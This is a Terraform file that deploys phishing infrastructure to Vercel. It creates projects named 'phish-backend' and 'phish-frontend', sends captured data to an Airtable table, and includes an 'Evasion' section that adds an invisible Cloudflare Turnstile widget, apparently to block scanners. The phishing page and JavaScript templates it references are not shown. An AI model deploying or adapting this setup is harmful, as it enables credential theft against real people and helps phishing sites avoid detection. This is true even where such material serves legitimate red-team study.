terraform {
  required_providers {
    vercel = {
      source  = "vercel/vercel"
      version = "~> 0.4"
    }
    cloudflare = {
      source = "cloudflare/cloudflare"
      version = "~> 4"
    }
  }
}


/****
Input
*****/

variable "vercel_token" {
    type = string
}

variable "cloudflare_token" {
    type = string
}

variable "cloudflare_account_id" {
    type = string
}

variable "airtable_key" {
    type = string
}

variable "airtable_id" {
    type = string
}

variable "airtable_table" {
    type = string
}


provider "vercel" {
  api_token = var.vercel_token 
}

provider "cloudflare" {
  api_token = var.cloudflare_token 
}



/******
Evasion
*******/

resource "cloudflare_turnstile_widget" "phish_turnstile" {
  account_id     = var.cloudflare_account_id 
  name           = "My widget"
  domains        = [ "vercel.app" ]
  mode           = "invisible"
}



/******
Backend
*******/

resource "local_sensitive_file" "protectjs" {
    filename = "backend/api/protect.js"
    content = templatefile("templates/protect.js.tpl", {
        secret = cloudflare_turnstile_widget.phish_turnstile.secret
    })
}

resource "local_sensitive_file" "processjs" {
    filename = "backend/api/process.js"
    content = templatefile("templates/process.js.tpl", {
        key = var.airtable_key, 
        id = var.airtable_id, 
        table = var.airtable_table
    })
}

resource "vercel_project" "phish_backend" {
  name      = "phish-backend"
}

data "vercel_project_directory" "phish_backend" {
  path = "./backend"
}

resource "vercel_deployment" "phish_backend" {
  project_id  = vercel_project.phish_backend.id
  files       = data.vercel_project_directory.phish_backend.files
  path_prefix = "backend"
  production  = true
}


/*******
Frontend
********/

resource "local_file" "mainjs" {
    filename = "frontend/main.js"
    content = templatefile("templates/main.js.tpl", {
        domain = vercel_deployment.phish_backend.domains[0]
    })
}

resource "local_file" "turnstilejs" {
    filename = "frontend/turnstile.js"
    content = templatefile("templates/turnstile.js.tpl", {
        sitekey = cloudflare_turnstile_widget.phish_turnstile.id,
        domain = vercel_deployment.phish_backend.domains[0]
    })
}

resource "local_file" "phishtpl" {
    filename = "backend/data/phish.tpl"
    content = templatefile("templates/phish.tpl", {})
}

resource "vercel_project" "phish_frontend" {
  name      = "phish-frontend"
}

data "vercel_project_directory" "phish_frontend" {
  path = "./frontend"
}

resource "vercel_deployment" "phish_frontend" {
  project_id  = vercel_project.phish_frontend.id
  files       = data.vercel_project_directory.phish_frontend.files
  path_prefix = "frontend"
  production  = true
}

/*****
Output
******/

output "Frontend" {
  value = vercel_deployment.phish_frontend.domains[0]
}

output "Backend" {
  value = vercel_deployment.phish_backend.domains[0]
}